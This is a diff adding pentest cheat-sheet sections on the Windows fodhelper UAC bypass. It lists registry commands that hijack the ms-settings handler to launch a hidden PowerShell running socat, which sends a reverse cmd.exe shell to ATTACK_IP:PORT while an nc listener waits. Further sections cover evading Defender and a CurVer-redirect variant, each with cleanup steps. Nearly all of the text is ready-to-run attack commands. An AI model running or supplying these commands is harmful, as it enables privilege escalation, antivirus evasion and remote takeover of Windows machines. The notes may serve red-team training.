@@ -63,3 +63,54 @@
 ### Verification
 
 #### sigcheck64.exe -m c:\path\to\file.exe
+
+# FODHELPER
+
+#### 1) whoami
+
+#### 2) net user USER | find "Local Group"
+
+#### 3) whoami /groups | find "Label"
+
+#### 4) set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+
+#### 5) set CMD="powershell -windowstyle hidden c:\tools\socat.exe TCP:ATTACK_IP:PORT EXEC:cmd.exe,pipes"
+
+#### 6) reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+
+#### 7) reg add %REG_KEY% /d %CMD% /f
+
+#### 8) Attacker: nc -lvp PORT 
+
+#### 9) fodhelper.exe
+
+#### 10) red delete HKCU\Software\Classes\ms-settings\ /f (Cleanup)
+
+# BYPASS DEFENDER WITH FODHELPER
+
+#### 1) set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+
+#### 2) set CMD="powershell -windowstyle hidden c:\tools\socat.exe TCP:ATTACK_IP:PORT EXEC:cmd.exe,pipes"
+
+#### 3) reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+
+#### 4) reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
+
+#### 5) nc -lvnp PORT 
+
+# IMPROVED FODHELPER EXPLOIT
+
+#### 1) set CMD="powershell -windowstyle hidden c:\tools\socat.exe TCP:ATTACK_IP:PORT EXEC:cmd.exe,pipes"
+
+#### 2) reg add "HKCU\Software\Classes\.jim\Shell\Open\command" /d %CMD% /f
+
+#### 3) reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".jim" /f
+
+#### 4) fodhelper.exe
+
+#### 5) nc -lvp PORT
+
+#### 6) reg delete "HKCU\Software\Classes\.jim\" /f (Cleanup)
+
+#### reg delete "HKCU\Software\Classes\ms-settings" /f (Cleanup)
+
